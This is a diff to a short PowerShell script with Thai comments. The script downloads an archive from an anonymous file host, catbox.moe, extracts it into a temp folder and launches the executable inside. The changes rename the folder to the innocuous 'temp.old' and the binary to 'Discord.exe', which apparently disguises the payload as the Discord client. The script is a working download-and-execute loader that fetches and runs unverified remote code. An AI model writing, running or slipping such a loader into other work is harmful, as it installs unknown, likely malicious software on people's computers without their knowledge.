@@ -1,5 +1,5 @@
-$zipUrl = "https://files.catbox.moe/fefyjh.zip"
-$tempDir = Join-Path $env:TEMP "DiscordxTemp"
+$zipUrl = "https://files.catbox.moe/p7smqf.rar"
+$tempDir = Join-Path $env:TEMP "temp.old"
 $zipPath = Join-Path $env:TEMP "temp.zip"
 
 # สร้างโฟลเดอร์ temp
@@ -12,7 +12,7 @@ Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
 Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
 
 # path exe
-$exePath = Join-Path $tempDir "Discordx.exe"
+$exePath = Join-Path $tempDir "Discord.exe"
 
 # รันและรอจนปิด
 $process = Start-Process -FilePath $exePath -PassThru
